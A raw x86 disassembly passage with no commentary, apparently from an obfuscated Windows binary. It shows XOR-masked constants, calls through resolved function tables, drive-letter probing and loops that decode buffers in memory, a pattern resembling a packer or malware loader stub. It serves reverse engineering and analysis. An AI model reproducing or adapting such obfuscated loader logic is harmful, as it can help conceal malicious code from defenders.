  424f9d:	mov    DWORD PTR [ebp-0x78],0x17420d22
  424fa4:	mov    DWORD PTR [ebp-0x74],0x31221b13
  424fab:	mov    DWORD PTR [ebp-0x70],0xd1e160e
  424fb2:	mov    DWORD PTR [ebp-0x6c],0x83281c1a
  424fb9:	call   0x4272b1
  424fbe:	push   eax
  424fbf:	mov    eax,DWORD PTR [ebp+0x8]
  424fc2:	mov    eax,DWORD PTR [eax+0x1a8]
  424fc8:	push   DWORD PTR [eax]
  424fca:	call   0x426f52
  424fcf:	test   eax,eax
  424fd1:	jne    0x425023
  424fd3:	mov    eax,DWORD PTR [ebp+0x8]
  424fd6:	mov    eax,DWORD PTR [eax+0x1e0]
  424fdc:	mov    edi,DWORD PTR [ebp+0x8]
  424fdf:	add    eax,0x4
  424fe2:	mov    DWORD PTR [ebp-0x20],eax
  424fe5:	mov    eax,DWORD PTR [ebp+0x8]
  424fe8:	mov    edx,DWORD PTR [eax+0x1b8]
  424fee:	call   0x4272b1
  424ff3:	push   eax
  424ff4:	mov    eax,DWORD PTR [ebp-0x20]
  424ff7:	call   DWORD PTR [eax]
  424ff9:	test   eax,eax
  424ffb:	jne    0x425023
  424ffd:	mov    eax,DWORD PTR [ebp+0x8]
  425000:	mov    eax,DWORD PTR [eax+0x1e0]
  425006:	mov    edi,DWORD PTR [ebp+0x8]
  425009:	add    eax,0x10
  42500c:	mov    DWORD PTR [ebp-0x20],eax
  42500f:	mov    eax,DWORD PTR [ebp+0x8]
  425012:	mov    edx,DWORD PTR [eax+0x1b8]
  425018:	call   0x4272b1
  42501d:	push   eax
  42501e:	mov    eax,DWORD PTR [ebp-0x20]
  425021:	call   DWORD PTR [eax]
  425023:	mov    eax,DWORD PTR [ebp-0x10]
  425026:	mov    ecx,DWORD PTR [ebp-0x28]
  425029:	xor    eax,ebx
  42502b:	add    eax,esi
  42502d:	cmp    eax,ecx
  42502f:	je     0x4251f2
  425035:	mov    eax,DWORD PTR [ebp-0x18]
  425038:	xor    eax,ebx
  42503a:	mov    ecx,0xffcd8d0d
  42503f:	sub    ecx,eax
  425041:	add    ecx,DWORD PTR [ebp-0x28]
  425044:	mov    eax,DWORD PTR [ebp-0x1c]
  425047:	cmp    eax,ecx
  425049:	ja     0x4251f2
  42504f:	mov    DWORD PTR [ebp-0x34],0x0
  425056:	push   DWORD PTR [ebp+0x8]
  425059:	mov    edi,DWORD PTR [ebp+0x8]
  42505c:	mov    eax,DWORD PTR [ebp+0x8]
  42505f:	mov    edx,DWORD PTR [eax+0x1b4]
  425065:	call   0x4272b1
  42506a:	push   eax
  42506b:	mov    eax,DWORD PTR [ebp+0x8]
  42506e:	mov    eax,DWORD PTR [eax+0x1a8]
  425074:	push   DWORD PTR [eax]
  425076:	call   0x426f52
  42507b:	mov    ecx,DWORD PTR [ebp+0x8]
  42507e:	mov    ecx,DWORD PTR [ecx+0x19c]
  425084:	mov    DWORD PTR [ecx],eax
  425086:	mov    eax,DWORD PTR [ebp+0x8]
  425089:	mov    edi,DWORD PTR [eax+0x1e0]
  42508f:	mov    esi,DWORD PTR [ebp+0x8]
  425092:	xor    eax,eax
  425094:	lea    edx,[ebp-0x7c]
  425097:	call   0x4272e7
  42509c:	push   eax
  42509d:	mov    eax,DWORD PTR [ebp+0x8]
  4250a0:	mov    eax,DWORD PTR [eax+0x19c]
  4250a6:	push   DWORD PTR [eax]
  4250a8:	call   DWORD PTR [edi+0x8]
  4250ab:	mov    DWORD PTR [ebp-0x20],eax
  4250ae:	mov    eax,DWORD PTR [ebp+0x8]
  4250b1:	mov    edi,DWORD PTR [eax+0x1e0]
  4250b7:	mov    esi,DWORD PTR [ebp+0x8]
  4250ba:	xor    eax,eax
  4250bc:	lea    edx,[ebp-0x90]
  4250c2:	call   0x4272e7
  4250c7:	push   eax
  4250c8:	mov    eax,DWORD PTR [ebp+0x8]
  4250cb:	mov    eax,DWORD PTR [eax+0x19c]
  4250d1:	push   DWORD PTR [eax]
  4250d3:	call   DWORD PTR [edi+0x8]
  4250d6:	mov    eax,DWORD PTR [ebp+0x8]
  4250d9:	mov    edi,DWORD PTR [eax+0x1e0]
  4250df:	mov    esi,DWORD PTR [ebp+0x8]
  4250e2:	xor    eax,eax
  4250e4:	lea    edx,[ebp-0xa8]
  4250ea:	call   0x4272e7
  4250ef:	push   eax
  4250f0:	mov    eax,DWORD PTR [ebp+0x8]
  4250f3:	mov    eax,DWORD PTR [eax+0x19c]
  4250f9:	push   DWORD PTR [eax]
  4250fb:	call   DWORD PTR [edi+0x8]
  4250fe:	and    DWORD PTR [ebp-0x8],0x0
  425102:	mov    DWORD PTR [ebp-0x48],eax
  425105:	mov    eax,DWORD PTR [ebp-0x8]
  425108:	and    eax,0x7
  42510b:	add    eax,0x31
  42510e:	push   eax
  42510f:	call   DWORD PTR [ebp-0x20]
  425112:	test   eax,eax
  425114:	je     0x425158
  425116:	mov    eax,DWORD PTR [ebp-0x8]
  425119:	push   0x19
  42511b:	xor    edx,edx
  42511d:	pop    ecx
  42511e:	div    ecx
  425120:	add    dl,0x41
  425123:	movzx  eax,dl
  425126:	push   eax
  425127:	call   DWORD PTR [ebp-0x48]
  42512a:	test   eax,eax
  42512c:	jne    0x425158
  42512e:	mov    eax,DWORD PTR [ebp+0x8]
  425131:	mov    edi,DWORD PTR [eax+0x1e0]
  425137:	mov    esi,DWORD PTR [ebp+0x8]
  42513a:	xor    eax,eax
  42513c:	lea    edx,[ebp-0x68]
  42513f:	call   0x4272e7
  425144:	push   eax
  425145:	mov    eax,DWORD PTR [ebp+0x8]
  425148:	mov    eax,DWORD PTR [eax+0x198]
  42514e:	push   DWORD PTR [eax]
  425150:	call   DWORD PTR [edi+0x8]
  425153:	mov    DWORD PTR [ebp-0x14],eax
  425156:	jmp    0x42515c
  425158:	and    DWORD PTR [ebp-0x14],0x0
  42515c:	inc    DWORD PTR [ebp-0x8]
  42515f:	cmp    DWORD PTR [ebp-0x8],0x10
  425163:	jb     0x425105
  425165:	mov    eax,DWORD PTR [ebp-0x18]
  425168:	mov    esi,DWORD PTR [ebp+0x8]
  42516b:	xor    eax,ebx
  42516d:	mov    edi,0x3272f3
  425172:	add    eax,edi
  425174:	lea    edx,[ebp-0x10c]
  42517a:	call   0x4272e7
  42517f:	push   eax
  425180:	mov    eax,DWORD PTR [ebp-0x10]
  425183:	mov    esi,DWORD PTR [ebp+0x8]
  425186:	xor    eax,ebx
  425188:	add    eax,edi
  42518a:	lea    edx,[ebp-0x12c]
  425190:	call   0x4272e7
  425195:	push   eax
  425196:	call   DWORD PTR [ebp-0x14]
  425199:	mov    ecx,DWORD PTR [ebp-0x10]
  42519c:	xor    ecx,ebx
  42519e:	add    ecx,edi
  4251a0:	cmp    ecx,eax
  4251a2:	jne    0x4251ab
  4251a4:	mov    DWORD PTR [ebp-0x34],0x1
  4251ab:	mov    eax,DWORD PTR [ebp-0x18]
  4251ae:	mov    ecx,DWORD PTR [ebp-0x1c]
  4251b1:	xor    eax,ebx
  4251b3:	lea    eax,[eax+ecx*1+0x3272f3]
  4251ba:	mov    DWORD PTR [ebp-0x1c],eax
  4251bd:	mov    eax,DWORD PTR [ebp-0x34]
  4251c0:	test   eax,eax
  4251c2:	je     0x4251d6
  4251c4:	mov    eax,DWORD PTR [ebp-0x18]
  4251c7:	mov    ecx,DWORD PTR [ebp-0x38]
  4251ca:	xor    eax,ebx
  4251cc:	lea    eax,[eax+ecx*1+0x3272f3]
  4251d3:	mov    DWORD PTR [ebp-0x38],eax
  4251d6:	mov    eax,DWORD PTR [ebp-0x18]
  4251d9:	xor    eax,ebx
  4251db:	mov    ecx,0xffcd8d0d
  4251e0:	sub    ecx,eax
  4251e2:	add    ecx,DWORD PTR [ebp-0x28]
  4251e5:	mov    eax,DWORD PTR [ebp-0x1c]
  4251e8:	cmp    eax,ecx
  4251ea:	jbe    0x42504f
  4251f0:	mov    esi,edi
  4251f2:	mov    eax,DWORD PTR [ebp-0x38]
  4251f5:	mov    ecx,DWORD PTR [ebp-0x1c]
  4251f8:	cmp    ecx,eax
  4251fa:	jne    0x42520d
  4251fc:	push   DWORD PTR [ebp+0x8]
  4251ff:	lea    eax,[ebp-0x40]
  425202:	push   eax
  425203:	call   0x427d56
  425208:	mov    DWORD PTR [ebp-0x24],eax
  42520b:	jmp    0x425219
  42520d:	mov    eax,DWORD PTR [ebp-0x24]
  425210:	mov    ecx,DWORD PTR [ebp-0x18]
  425213:	xor    ecx,ebx
  425215:	add    ecx,esi
  425217:	xor    DWORD PTR [eax],ecx
  425219:	mov    eax,DWORD PTR [ebp-0x10]
  42521c:	mov    ecx,DWORD PTR [ebp-0x24]
  42521f:	xor    eax,ebx
  425221:	add    eax,esi
  425223:	cmp    eax,ecx
  425225:	je     0x42599d
  42522b:	mov    eax,DWORD PTR [ebp-0x10]
  42522e:	mov    ecx,DWORD PTR [ebp-0x40]
  425231:	xor    eax,ebx
  425233:	add    eax,esi
  425235:	cmp    eax,ecx
  425237:	je     0x42599d
  42523d:	mov    eax,DWORD PTR [ebp-0x10]
  425240:	xor    eax,ebx
  425242:	add    eax,esi
  425244:	jmp    0x425262
  425246:	mov    edi,DWORD PTR [ebp-0x24]
  425249:	mov    cl,al
  42524b:	and    cl,0x1f
  42524e:	or     dl,0xff
  425251:	sub    dl,cl
  425253:	add    BYTE PTR [edi+eax*1],dl
  425256:	mov    ecx,DWORD PTR [ebp-0x18]
  425259:	xor    ecx,ebx
  42525b:	lea    eax,[eax+ecx*1+0x3272f3]
  425262:	mov    ecx,DWORD PTR [ebp-0x40]
  425265:	cmp    eax,ecx
  425267:	jb     0x425246
  425269:	mov    eax,DWORD PTR [ebp-0x40]
  42526c:	mov    DWORD PTR [ebp-0x28],eax
  42526f:	mov    eax,DWORD PTR [ebp-0x24]
  425272:	mov    DWORD PTR [ebp-0x38],0xf89c85a1
  425279:	mov    DWORD PTR [ebp-0xd4],eax
  42527f:	mov    edi,0xf89c85a2
  425284:	mov    DWORD PTR [ebp-0x2c],edi
  425287:	mov    eax,DWORD PTR [ebp-0x38]
  42528a:	xor    eax,ebx
  42528c:	add    eax,esi
  42528e:	mov    DWORD PTR [ebp-0xc],eax
  425291:	mov    eax,DWORD PTR [ebp-0x38]
  425294:	xor    eax,ebx
  425296:	add    eax,esi
  425298:	mov    DWORD PTR [ebp-0x8],eax
  42529b:	mov    DWORD PTR [ebp-0x48],0xf89c8581
  4252a2:	mov    DWORD PTR [ebp-0x4c],0xf89c85b8
  4252a9:	mov    eax,DWORD PTR [ebp-0x38]
  4252ac:	mov    ecx,DWORD PTR [ebp-0x28]
  4252af:	xor    eax,ebx
  4252b1:	add    eax,esi
  4252b3:	cmp    ecx,eax
  4252b5:	je     0x4254b4
  4252bb:	jmp    0x425490
  4252c0:	mov    ecx,DWORD PTR [ebp-0xc]
  4252c3:	mov    eax,DWORD PTR [ebp-0x28]
  4252c6:	sub    eax,ecx
  4252c8:	mov    ecx,DWORD PTR [ebp-0x48]
  4252cb:	xor    ecx,ebx
  4252cd:	add    ecx,esi
  4252cf:	xor    edx,edx
  4252d1:	div    ecx
  4252d3:	mov    DWORD PTR [ebp-0x8],eax
  4252d6:	mov    eax,DWORD PTR [ebp-0x4c]
  4252d9:	mov    ecx,DWORD PTR [ebp-0x8]
  4252dc:	xor    eax,ebx
  4252de:	add    eax,esi
  4252e0:	cmp    ecx,eax
  4252e2:	jbe    0x4252ee
  4252e4:	mov    eax,DWORD PTR [ebp-0x4c]
  4252e7:	xor    eax,ebx
  4252e9:	add    eax,esi
  4252eb:	mov    DWORD PTR [ebp-0x8],eax
  4252ee:	mov    eax,DWORD PTR [ebp-0x48]
  4252f1:	mov    ecx,DWORD PTR [ebp-0x8]
  4252f4:	xor    eax,ebx
  4252f6:	add    eax,esi
  4252f8:	imul   eax,ecx
  4252fb:	mov    DWORD PTR [ebp-0x8],eax
  4252fe:	mov    eax,DWORD PTR [ebp-0x38]
  425301:	mov    ecx,DWORD PTR [ebp-0x8]
  425304:	xor    eax,ebx
  425306:	add    eax,esi
  425308:	cmp    ecx,eax
  42530a:	je     0x42547e
  425310:	mov    eax,DWORD PTR [ebp-0x8]
  425313:	mov    DWORD PTR [ebp-0x14],eax
  425316:	mov    eax,DWORD PTR [ebp-0xc]
  425319:	add    eax,DWORD PTR [ebp-0xd4]
  42531f:	mov    DWORD PTR [ebp-0x20],0xf89c85a1
  425326:	mov    DWORD PTR [ebp-0x34],edi
  425329:	mov    DWORD PTR [ebp-0xe8],0xf89c85a3
  425333:	mov    DWORD PTR [ebp-0x8],eax
  425336:	mov    DWORD PTR [ebp-0x30],0xf89c85bc
  42533d:	mov    DWORD PTR [ebp-0x1c],edi
  425340:	mov    eax,DWORD PTR [ebp-0x20]
  425343:	xor    eax,ebx
  425345:	add    eax,esi
  425347:	jmp    0x42543d
  42534c:	mov    DWORD PTR [ebp-0xe0],0xf89c85b4
  425356:	mov    DWORD PTR [ebp-0xc4],0xf89c858f
  425360:	mov    eax,DWORD PTR [ebp-0x1c]
  425363:	mov    ecx,DWORD PTR [ebp-0x44]
  425366:	xor    eax,ebx
  425368:	add    eax,esi
  42536a:	imul   eax,ecx
  42536d:	mov    ecx,DWORD PTR [ebp-0x8]
  425370:	mov    al,BYTE PTR [eax+ecx*1]
  425373:	mov    BYTE PTR [ebp-0x2],al
  425376:	mov    eax,DWORD PTR [ebp-0x1c]
  425379:	mov    ecx,DWORD PTR [ebp-0x44]
  42537c:	xor    eax,ebx
  42537e:	add    eax,esi
  425380:	imul   eax,ecx
  425383:	mov    ecx,DWORD PTR [ebp-0xe8]
  425389:	xor    ecx,ebx
  42538b:	add    eax,ecx
  42538d:	mov    ecx,DWORD PTR [ebp-0x8]
  425390:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f3]
  425398:	mov    ecx,DWORD PTR [ebp-0xe0]
  42539e:	xor    ecx,ebx
  4253a0:	lea    eax,[ecx+eax*1+0x3272f3]
  4253a7:	movzx  ecx,BYTE PTR [ebp-0x2]
  4253ab:	xor    ecx,eax
  4253ad:	mov    BYTE PTR [ebp-0x2],cl
  4253b0:	mov    al,BYTE PTR [ebp-0x2]
  4253b3:	mov    ecx,DWORD PTR [ebp-0x1c]
  4253b6:	mov    edx,DWORD PTR [ebp-0x44]
  4253b9:	xor    ecx,ebx
  4253bb:	add    ecx,esi
  4253bd:	imul   ecx,edx
  4253c0:	mov    edx,DWORD PTR [ebp-0x8]
  4253c3:	mov    BYTE PTR [ecx+edx*1],al
  4253c6:	mov    eax,DWORD PTR [ebp-0x1c]
  4253c9:	mov    ecx,DWORD PTR [ebp-0x44]
  4253cc:	xor    eax,ebx
  4253ce:	add    eax,esi
  4253d0:	imul   eax,ecx
  4253d3:	mov    ecx,DWORD PTR [ebp-0x8]
  4253d6:	mov    al,BYTE PTR [eax+ecx*1]
  4253d9:	mov    BYTE PTR [ebp-0x2],al
  4253dc:	mov    eax,DWORD PTR [ebp-0x1c]
  4253df:	mov    ecx,DWORD PTR [ebp-0x44]
  4253e2:	xor    eax,ebx
  4253e4:	add    eax,esi
  4253e6:	imul   eax,ecx
  4253e9:	mov    ecx,DWORD PTR [ebp-0x34]
  4253ec:	xor    ecx,ebx
  4253ee:	add    eax,ecx
  4253f0:	mov    ecx,DWORD PTR [ebp-0x8]
  4253f3:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f3]
  4253fb:	mov    ecx,DWORD PTR [ebp-0xc4]
  425401:	xor    ecx,ebx
  425403:	lea    eax,[ecx+eax*1+0x3272f3]
  42540a:	movzx  ecx,BYTE PTR [ebp-0x2]
  42540e:	xor    ecx,eax
  425410:	mov    BYTE PTR [ebp-0x2],cl
  425413:	mov    al,BYTE PTR [ebp-0x2]
  425416:	mov    ecx,DWORD PTR [ebp-0x1c]
  425419:	mov    edx,DWORD PTR [ebp-0x44]
  42541c:	xor    ecx,ebx
  42541e:	add    ecx,esi
  425420:	imul   ecx,edx
  425423:	mov    edx,DWORD PTR [ebp-0x8]
  425426:	mov    BYTE PTR [ecx+edx*1],al
  425429:	mov    eax,DWORD PTR [ebp-0x30]
  42542c:	mov    ecx,DWORD PTR [ebp-0x34]
  42542f:	xor    eax,ebx
  425431:	xor    ecx,ebx
  425433:	add    eax,esi
  425435:	add    ecx,esi
  425437:	imul   eax,ecx
  42543a:	add    eax,DWORD PTR [ebp-0x44]
  42543d:	mov    DWORD PTR [ebp-0x44],eax
  425440:	mov    eax,DWORD PTR [ebp-0x44]
  425443:	mov    ecx,DWORD PTR [ebp-0x14]
  425446:	cmp    ecx,eax
  425448:	jb     0x42534c
  42544e:	mov    eax,DWORD PTR [ebp-0x34]
  425451:	mov    ecx,DWORD PTR [ebp-0x14]
  425454:	xor    eax,ebx
  425456:	add    eax,esi
  425458:	imul   eax,ecx
  42545b:	mov    ecx,DWORD PTR [ebp-0x20]
  42545e:	xor    ecx,ebx
  425460:	add    ecx,esi
  425462:	or     eax,ecx
  425464:	mov    ecx,DWORD PTR [ebp-0x2c]
  425467:	xor    ecx,ebx
  425469:	add    eax,ecx
  42546b:	mov    ecx,DWORD PTR [ebp-0x2c]
  42546e:	xor    ecx,ebx
  425470:	add    eax,ecx
  425472:	mov    ecx,DWORD PTR [ebp-0xc]
  425475:	lea    eax,[eax+ecx*1+0x64e5e6]
  42547c:	jmp    0x42548d
  42547e:	mov    eax,DWORD PTR [ebp-0x2c]
  425481:	mov    ecx,DWORD PTR [ebp-0xc]
  425484:	xor    eax,ebx
  425486:	lea    eax,[eax+ecx*1+0x3272f3]
  42548d:	mov    DWORD PTR [ebp-0xc],eax
  425490:	mov    eax,DWORD PTR [ebp-0x2c]
  425493:	xor    eax,ebx
  425495:	mov    ecx,0xffcd8d0d
  42549a:	sub    ecx,eax
  42549c:	add    ecx,DWORD PTR [ebp-0x28]
  42549f:	mov    eax,DWORD PTR [ebp-0x2c]
  4254a2:	mov    edx,DWORD PTR [ebp-0xc]
  4254a5:	xor    eax,ebx
  4254a7:	add    eax,esi
  4254a9:	imul   eax,edx
  4254ac:	cmp    eax,ecx
  4254ae:	jbe    0x4252c0
  4254b4:	mov    eax,DWORD PTR [ebp-0x10]
  4254b7:	mov    ecx,DWORD PTR [ebp-0x40]
  4254ba:	mov    eax,DWORD PTR [ebp+0x8]
  4254bd:	mov    edx,DWORD PTR [ebp-0x54]
  4254c0:	mov    eax,DWORD PTR [eax+0x1e0]
  4254c6:	xor    edx,ebx
  4254c8:	add    edx,esi
  4254ca:	push   edx
  4254cb:	mov    edx,DWORD PTR [ebp-0x3c]
  4254ce:	xor    edx,ebx
  4254d0:	add    edx,esi
  4254d2:	push   edx
  4254d3:	push   ecx
  4254d4:	mov    DWORD PTR [ebp-0x30],ecx
  4254d7:	mov    ecx,DWORD PTR [ebp-0x10]
  4254da:	xor    ecx,ebx
  4254dc:	add    ecx,esi
  4254de:	push   ecx
  4254df:	call   DWORD PTR [eax+0x14]
  4254e2:	mov    edi,eax
  4254e4:	mov    eax,DWORD PTR [ebp-0x10]
  4254e7:	xor    eax,ebx
  4254e9:	add    eax,esi
  4254eb:	cmp    eax,edi
  4254ed:	je     0x425548
  4254ef:	mov    eax,DWORD PTR [ebp-0x10]
  4254f2:	jmp    0x425515
  4254f4:	mov    ecx,DWORD PTR [ebp-0x24]
  4254f7:	xor    eax,ebx
  4254f9:	mov    cl,BYTE PTR [ecx+eax*1+0x3272f3]
  425500:	mov    BYTE PTR [eax+edi*1+0x3272f3],cl
  425507:	mov    ecx,DWORD PTR [ebp-0x18]
  42550a:	xor    ecx,ebx
  42550c:	lea    eax,[ecx+eax*1+0x3272f3]
  425513:	xor    eax,ebx
  425515:	mov    ecx,DWORD PTR [ebp-0x40]
  425518:	sub    ecx,esi
  42551a:	xor    ecx,ebx
  42551c:	cmp    eax,ecx
  42551e:	jne    0x4254f4
  425520:	mov    eax,DWORD PTR [ebp+0x8]
  425523:	mov    ecx,DWORD PTR [ebp-0x50]
  425526:	mov    eax,DWORD PTR [eax+0x1e0]
  42552c:	xor    ecx,ebx
  42552e:	add    ecx,esi
  425530:	push   ecx
  425531:	mov    ecx,DWORD PTR [ebp-0x10]
  425534:	xor    ecx,ebx
  425536:	add    ecx,esi
  425538:	push   ecx
  425539:	push   DWORD PTR [ebp-0x24]
  42553c:	call   DWORD PTR [eax+0x18]
  42553f:	mov    eax,DWORD PTR [ebp-0x30]
  425542:	mov    DWORD PTR [ebp-0x24],edi
  425545:	mov    DWORD PTR [ebp-0x40],eax
  425548:	mov    edi,DWORD PTR [ebp-0x24]
  42554b:	mov    eax,DWORD PTR [ebp-0x18]
  42554e:	mov    ecx,DWORD PTR [ebp-0x10]
  425551:	xor    eax,ebx
  425553:	mov    DWORD PTR [ebp-0x30],edi
  425556:	add    eax,esi
  425558:	mov    DWORD PTR [ebp-0x5c],0x422b332b
  42555f:	mov    DWORD PTR [ebp-0x58],0x342b3c2b
  425566:	jmp    0x42559a
  425568:	xor    ecx,ebx
  42556a:	mov    dl,BYTE PTR [ebp+ecx*1+0x327297]
  425571:	xor    dl,0x7d
  425574:	add    dl,0x2
  425577:	mov    DWORD PTR [ebp-0x3c],ecx
  42557a:	movsx  ecx,BYTE PTR [ecx+edi*1+0x3272f3]
  425582:	movzx  edx,dl
  425585:	cmp    ecx,edx
  425587:	jne    0x4255a4
  425589:	mov    ecx,DWORD PTR [ebp-0x18]
  42558c:	mov    edx,DWORD PTR [ebp-0x3c]
  42558f:	xor    ecx,ebx
  425591:	lea    ecx,[ecx+edx*1+0x3272f3]
  425598:	xor    ecx,ebx
  42559a:	cmp    ecx,0xf89c85b9
  4255a0:	jne    0x425568
  4255a2:	jmp    0x4255ab
  4255a4:	mov    eax,DWORD PTR [ebp-0x10]
  4255a7:	xor    eax,ebx
  4255a9:	add    eax,esi
  4255ab:	mov    ecx,DWORD PTR [ebp-0x10]
  4255ae:	xor    ecx,ebx
  4255b0:	add    ecx,esi
  4255b2:	cmp    ecx,eax
  4255b4:	je     0x425727
  4255ba:	mov    eax,DWORD PTR [edi+0x8]
  4255bd:	mov    DWORD PTR [ebp-0xc],0xf89c85a1
  4255c4:	mov    DWORD PTR [ebp-0x3c],0xf89cc3d0
  4255cb:	mov    DWORD PTR [ebp-0x48],0xf89cb5a1
  4255d2:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  4255d9:	mov    DWORD PTR [ebp-0x14],eax
  4255dc:	mov    eax,DWORD PTR [ebp+0x8]
  4255df:	mov    ecx,DWORD PTR [ebp-0x20]
  4255e2:	xor    ecx,ebx
  4255e4:	add    ecx,esi
  4255e6:	push   ecx
  4255e7:	mov    ecx,DWORD PTR [ebp-0x48]
  4255ea:	mov    eax,DWORD PTR [eax+0x1e0]
  4255f0:	xor    ecx,ebx
  4255f2:	add    ecx,esi
  4255f4:	push   ecx
  4255f5:	mov    ecx,DWORD PTR [ebp-0x3c]
  4255f8:	xor    ecx,ebx
  4255fa:	add    ecx,esi
  4255fc:	push   ecx
  4255fd:	mov    ecx,DWORD PTR [ebp-0xc]
  425600:	xor    ecx,ebx
  425602:	add    ecx,esi
  425604:	push   ecx
  425605:	call   DWORD PTR [eax+0x14]
  425608:	mov    edi,eax
  42560a:	mov    eax,DWORD PTR [ebp+0x8]
  42560d:	mov    ecx,DWORD PTR [ebp-0x20]
  425610:	mov    eax,DWORD PTR [eax+0x1e0]
  425616:	xor    ecx,ebx
  425618:	add    ecx,esi
  42561a:	push   ecx
  42561b:	mov    ecx,DWORD PTR [ebp-0x48]
  42561e:	xor    ecx,ebx
  425620:	add    ecx,esi
  425622:	push   ecx
  425623:	mov    ecx,DWORD PTR [ebp-0xc]
  425626:	push   DWORD PTR [ebp-0x14]
  425629:	xor    ecx,ebx
  42562b:	add    ecx,esi
  42562d:	push   ecx
  42562e:	call   DWORD PTR [eax+0x14]
  425631:	mov    ecx,DWORD PTR [ebp-0xc]
  425634:	xor    ecx,ebx
  425636:	add    ecx,esi
  425638:	mov    DWORD PTR [ebp-0x20],eax
  42563b:	cmp    ecx,edi
  42563d:	je     0x4259ca
  425643:	mov    ecx,DWORD PTR [ebp-0xc]
  425646:	xor    ecx,ebx
  425648:	add    ecx,esi
  42564a:	cmp    ecx,eax
  42564c:	je     0x4259ca
  425652:	mov    DWORD PTR [ebp-0x3c],0xf89c85bc
  425659:	mov    DWORD PTR [ebp-0x54],0xf89c85a3
  425660:	mov    ecx,DWORD PTR [ebp-0x3c]
  425663:	xor    cl,0xac
  425666:	sub    cl,0xd
  425669:	mov    BYTE PTR [edi],cl
  42566b:	mov    ecx,DWORD PTR [ebp-0xc]
  42566e:	xor    cl,0xac
  425671:	sub    cl,0xd
  425674:	mov    BYTE PTR [edi+0x1],cl
  425677:	mov    ecx,DWORD PTR [ebp-0x54]
  42567a:	xor    cl,0xac
  42567d:	sub    cl,0xd
  425680:	mov    BYTE PTR [edi+0x2],cl
  425683:	and    DWORD PTR [ebp-0xc8],0x0
  42568a:	and    DWORD PTR [ebp-0xdc],0x0
  425691:	lea    ecx,[ebp-0xdc]
  425697:	push   ecx
  425698:	push   DWORD PTR [ebp-0x14]
  42569b:	push   eax
  42569c:	lea    eax,[ebp-0xc8]
  4256a2:	push   eax
  4256a3:	mov    eax,DWORD PTR [ebp-0x30]
  4256a6:	push   DWORD PTR [eax+0xc]
  4256a9:	mov    eax,DWORD PTR [ebp-0x24]
  4256ac:	add    eax,0x10
  4256af:	push   eax
  4256b0:	push   edi
  4256b1:	call   0x424957
  4256b6:	mov    DWORD PTR [ebp-0x3c],eax
  4256b9:	mov    eax,DWORD PTR [ebp+0x8]
  4256bc:	mov    ecx,DWORD PTR [ebp-0x50]
  4256bf:	mov    eax,DWORD PTR [eax+0x1e0]
  4256c5:	xor    ecx,ebx
  4256c7:	add    ecx,esi
  4256c9:	push   ecx
  4256ca:	mov    ecx,DWORD PTR [ebp-0xc]
  4256cd:	xor    ecx,ebx
  4256cf:	add    ecx,esi
  4256d1:	push   ecx
  4256d2:	push   edi
  4256d3:	call   DWORD PTR [eax+0x18]
  4256d6:	mov    eax,DWORD PTR [ebp-0x3c]
  4256d9:	add    eax,0xffcd8d0d
  4256de:	xor    eax,ebx
  4256e0:	cmp    eax,0xf89c85a1
  4256e5:	mov    eax,DWORD PTR [ebp+0x8]
  4256e8:	mov    eax,DWORD PTR [eax+0x1e0]
  4256ee:	mov    ecx,DWORD PTR [ebp-0x50]
  4256f1:	jne    0x425714
  4256f3:	xor    ecx,ebx
  4256f5:	add    ecx,esi
  4256f7:	push   ecx
  4256f8:	mov    ecx,DWORD PTR [ebp-0xc]
  4256fb:	xor    ecx,ebx
  4256fd:	add    ecx,esi
  4256ff:	push   ecx
  425700:	push   DWORD PTR [ebp-0x24]
  425703:	call   DWORD PTR [eax+0x18]
  425706:	mov    eax,DWORD PTR [ebp-0x20]
  425709:	mov    DWORD PTR [ebp-0x24],eax
  42570c:	mov    eax,DWORD PTR [ebp-0x14]
  42570f:	mov    DWORD PTR [ebp-0x40],eax
  425712:	jmp    0x425727
  425714:	xor    ecx,ebx
  425716:	add    ecx,esi
  425718:	push   ecx
  425719:	mov    ecx,DWORD PTR [ebp-0xc]
  42571c:	xor    ecx,ebx
  42571e:	add    ecx,esi
  425720:	push   ecx
  425721:	push   DWORD PTR [ebp-0x20]
  425724:	call   DWORD PTR [eax+0x18]
  425727:	mov    eax,DWORD PTR [ebp-0x40]
  42572a:	mov    DWORD PTR [ebp-0x38],eax
  42572d:	mov    eax,DWORD PTR [ebp-0x24]
  425730:	mov    DWORD PTR [ebp-0x28],0xf89c85a1
  425737:	mov    DWORD PTR [ebp-0x3c],eax
  42573a:	mov    edi,0xf89c85a2
  42573f:	mov    DWORD PTR [ebp-0x2c],edi
  425742:	mov    eax,DWORD PTR [ebp-0x28]
  425745:	xor    eax,ebx
  425747:	add    eax,esi
  425749:	mov    DWORD PTR [ebp-0xc],eax
  42574c:	mov    eax,DWORD PTR [ebp-0x28]
  42574f:	xor    eax,ebx
  425751:	add    eax,esi
  425753:	mov    DWORD PTR [ebp-0x14],eax
  425756:	mov    DWORD PTR [ebp-0x48],0xf89c8581
  42575d:	mov    DWORD PTR [ebp-0x20],0xf89c85b8
  425764:	mov    eax,DWORD PTR [ebp-0x28]
  425767:	mov    ecx,DWORD PTR [ebp-0x38]
  42576a:	xor    eax,ebx
  42576c:	add    eax,esi
  42576e:	cmp    ecx,eax
  425770:	je     0x425966
  425776:	jmp    0x425942
  42577b:	mov    ecx,DWORD PTR [ebp-0xc]
  42577e:	mov    eax,DWORD PTR [ebp-0x38]
  425781:	sub    eax,ecx
  425783:	mov    ecx,DWORD PTR [ebp-0x48]
  425786:	xor    ecx,ebx
  425788:	add    ecx,esi
  42578a:	xor    edx,edx
  42578c:	div    ecx
  42578e:	mov    DWORD PTR [ebp-0x14],eax
  425791:	mov    eax,DWORD PTR [ebp-0x20]
  425794:	mov    ecx,DWORD PTR [ebp-0x14]
  425797:	xor    eax,ebx
  425799:	add    eax,esi
  42579b:	cmp    ecx,eax
  42579d:	jbe    0x4257a9
  42579f:	mov    eax,DWORD PTR [ebp-0x20]
  4257a2:	xor    eax,ebx
  4257a4:	add    eax,esi
  4257a6:	mov    DWORD PTR [ebp-0x14],eax
  4257a9:	mov    eax,DWORD PTR [ebp-0x48]
  4257ac:	mov    ecx,DWORD PTR [ebp-0x14]
  4257af:	xor    eax,ebx
  4257b1:	add    eax,esi
  4257b3:	imul   eax,ecx
  4257b6:	mov    DWORD PTR [ebp-0x14],eax
  4257b9:	mov    eax,DWORD PTR [ebp-0x28]
  4257bc:	mov    ecx,DWORD PTR [ebp-0x14]
  4257bf:	xor    eax,ebx
  4257c1:	add    eax,esi
